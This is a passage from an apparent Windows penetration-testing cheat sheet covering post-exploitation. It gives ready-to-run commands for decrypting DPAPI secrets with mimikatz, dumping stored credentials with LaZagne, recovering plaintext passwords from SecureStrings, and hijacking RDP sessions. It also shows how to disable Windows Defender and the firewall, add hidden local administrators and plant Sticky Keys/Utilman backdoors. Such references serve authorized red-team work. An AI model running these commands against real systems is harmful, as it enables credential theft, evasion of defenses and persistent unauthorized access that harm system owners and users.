| Knowledge of the specific **domain** user **`NTLM` hash** and a network connection to a Domain Controller. | Uses the user's `NTLM` hash to replace the `Logon Session` in a process's `Access Token`, in order to access resources over the network using the provided user identity. Then leverages the `Microsoft BackupKey Remote Protocol (MS-BKRP)` `MSRPC` interface of a Domain Controller to request the decryption of the required `DPAPI` `MasterKey` (by design functionality, needed for password renewal and support of smart cards). | Identification of the required `MasterKey` (`guidMasterKey`): <br/> `mimikatz# dpapi::<MODULE> /in:<BLOB_PATH>` <br/> <br/>  Refer to the `Windows - Lateral movement` note for TTP to locally or remotely start a process using the user's `NTLM` hash. Under the newly created process, decryption of the required `MasterKey` through a `MS-BKRP` request to a Domain Controller: <br/> `mimikatz.exe "dpapi::masterkey /in:<MASTER_KEY_PATH> /rpc" exit` <br/> <br/> Decryption of the specified blob, with the according `mimikatz` module, using the required `MasterKey`: <br/> `mimikatz# token::elevate` <br/>  `mimikatz# dpapi::<MODULE> /in:<BLOB_PATH> /masterkey:<MASTER_KEY>` |
| Knowledge of the `DPAPI` `Domain Backup Key`. | Uses the `DPAPI` `Domain Backup Key` to decrypt the `DPAPI` `MasterKeys` of domain users in order to decrypt the specified `DPAPI` blob. | Identification of the required `MasterKey` (`guidMasterKey`): <br/> `mimikatz# dpapi::<MODULE> /in:<BLOB_PATH>` <br/> <br/> Decryption of the required `MasterKey` using the `DPAPI` `Domain Backup Key`: <br/> `mimikatz.exe "privilege::debug" "token::elevate" "dpapi::masterkey /in:<MASTER_KEY_PATH> /pvk:<BACKUP_KEY_PRIVATE_KEY_FILE>" exit` <br/> <br/> Decryption of the specified blob, with the according `mimikatz` module, using the required `MasterKey`: <br/> `mimikatz# token::elevate` <br/>  `mimikatz# dpapi::<MODULE> /in:<BLOB_PATH> /masterkey:<MASTER_KEY>` |

###### [SAM/mscachev2/LSASS/DPAPI] Automated Windows, generic and third parties credentials retrieval  

`LaZagne` is a Python utility, available as a standalone binary, that attempt
to retrieve the credentials possibly stored on a system by a number of third
party softwares, such as web browsers, system administrator and developers
utilities, etc. It will conduct the search for every user profiles and will
retrieve the credentials stored by third parties software through different
mediums (plaintext files, registry keys, local databases, etc.), decrypting the
`DPAPI` encrypted blob using the `MasterKeys` extracted from memory.
Additionally, `LaZagne` will retrieve credentials from the Windows `MScache`,
`SAM` registry hive and `LSASS` process if executed with the necessary
elevated privileges.

```
lazagne.exe all -oA -output <OUTPUT_FILE_PATH>
```

###### SecureString

If an encrypted standard string of a PowerShell  `SecureString` object is
compromised, from a file for example, the `SecureString` can be directly
re used:

```
$user = "<WORKGROUP | DOMAIN>\<USERNAME>";
$pass = "<SECURESTRING>" | ConvertTo-SecureString;
$creds = New-Object System.Management.Automation.PSCredential($user,$pass)

# Plaintext password can then be retrieved  
$creds.GetNetworkCredential() | fl
```

The PowerShell credentials object can now be passed to cmdlets supporting it,
such as `Start-Process` / `Start-Job` or `Invoke-Command` / `Enter-PSSession`.

Note that if the `SecureString` object was created using a plaintext password,
instead of using a `Key` / `SecureKey`, the stored standard string can only be
converted to a `SecureString` object by the account, local or domain joined,
that created the `SecureString` initially. Otherwise, the following error
message will be returned:  

```
ConvertTo-SecureString : Key not valid for use in specified state.
```

###### RDP Session Hijacking

If `Administrator` / `NT AUTHORITY\SYSTEM` privileges could be obtained on a
host, `Remote Desktop Protocol (RDP)` sessions of others users can be hijacked.
This could be leveraged to access the host under the security context of the
hijacked user, through a graphical explorer, with out knowing its password.

Note that:
  - Hijacking of disconnected sessions is possible
  - Hijacking a session will unlock locked sessions (with out the need to
    provide credentials)

Retrieve the `ID` of the eventual `RDP` sessions present on the host:

```
# SESSIONNAME = rdp-*
query user
```

Create and start a service that will execute `tscon` to hijack the specified
`RDP` session:

```
sc create sesshijack binpath= "cmd.exe /k tscon <SESSION_ID> /dest:<SESSION_NAME>"
net start sesshijack
```

### Network

The following commands can be used to retrieve information about the network
interfaces and active connections of the host:

|  | DOS | Powershell | WMI |
|--|-----|------------|-----|
| Network interfaces | ipconfig | | |
| Listening ports | netstat -ano | Get-NetTCPConnection <br/>Get-NetUDPEndpoint | |
| ARP table | arp -a  |   |   |

### Manage

###### Windows Defender

The following Powershell command can be used to switch off Windows Defender
real-time protection:

```
Set-MpPreference -DisableRealtimeMonitoring $true
```

###### Windows Firewall

To check whether the Windows Firewall is enabled on a server or computer,
the following command can be used as Administrator/SYSTEM:

```
# Show the profile applied to each network adapter
netsh advfirewall monitor show currentprofile

# Windows Firewall state for all profile (Public / Domain / Private)
netsh advfirewall show allprofiles
Get-NetFirewallProfile

# Show all rules for the given profile
netsh advfirewall firewall show rule profile=<public | private | domain | any | ...> name=all
Get-NetFirewallProfile -Name <Public | Private | Domain | * | ...> | Get-NetFirewallRule
```

By default, three separate listings are present: Domain profile settings,
private profile settings and public profile settings.  
With the private profile, applied to a network adapter when it is connected
to a network that is identified by the user or administrator as a private
network, Windows enables network discovery features, allows file sharing and
other networked features.   
The public profile, applied to a network adapter by default or if specified so
by an user or administrator, is the most restrictive profile. In the default
public profile, Windows will block all inbound connections to programs that are
not on the list of allowed programs.   
Finally, the Domain profile is used when a server or computer is joined to an
Active Directory domain. In this environment, firewall settings are typically
(but not necessarily) controlled by a network administrator.

Windows blocks inbound connections and allows outbound connections for all
profiles by default.

To disable the firewall use the following commands:

```
# Disable current profile
netsh advfirewall set currentprofile state off

# Disable all profiles
netsh advfirewall set allprofiles state off

# Disable the private, public and domain profiles
netsh advfirewall set privateprofile state off
netsh advfirewall set publicprofile state off
netsh advfirewall set domainprofile state off
```

To open a specific port, or a range, use the following command:

```
netsh advfirewall firewall add rule name="<RULE_NAME" protocol=TCP dir=in localport=<PORT> action=allow
```

###### Activate RDP

RDP can be enabled / disabled with out the need to restart the system with the
`reg` utility:

```
# Check if RDP is enabled
netstat /p tcp /a | findstr 3389
# If RDP is enabled, registry value should be equal to 0x0
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections

# Enable RDP
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

# Disable RDP
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
```

### Persistence

###### Add local Administrator

The following `net user` commands can be used to create and add a windows
account in the administrator group:

```
# Create a new account
net user /add <USERNAME> <PASSWORD>

# Add account as administrator
net localgroup Administrators <USERNAME> /add
net localgroup Administrateurs <USERNAME> /add
```

###### Grant user RDP access

To access a host remotely in RDP, the user used must be present in the "Remote
Desktop Users" localgroup on the host. The following `net localgroup` commands
can be used to add the specified user in this group:

```
net localgroup "Remote Desktop Users" <USERNAME> /add
net localgroup "Utilisateurs du Bureau à distance" <USERNAME> /add

# Connect in RDP from Linux
rdesktop -k fr -g 90% -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' <HOSTNAME | IP>
```

###### Sticky Keys or Utilman backdoors

Both the `Sticky Keys` (sethc.exe) and `Utilman` (utilman.exe) utility tools
can be launched at the login screen before authentication as `NT
AUTHORITY\SYSTEM`.

Replacing either of those binaries with `cmd.exe` can be a way to maintain
persistence on the compromised system.

```
cd windows\system32
copy cmd.exe sethc.exe
copy cmd.exe utilman.exe
```

The `sethc.exe` is launched after pushing the Maj key five times and the
`utilman.exe` can be started using Win + u.

However, a graphical access to the host login prompt is needed in order to
make use of this backdoor mechanism.  

To do so remotely:

  - RDP must be enabled and not firewalled on the host
  - RDP NLA deactivated if no valid credentials are known (credentials of a
    user in the Remote Desktop Users group).

###### ASEP / WMI subscription / DLL hijacking

TODO
https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf
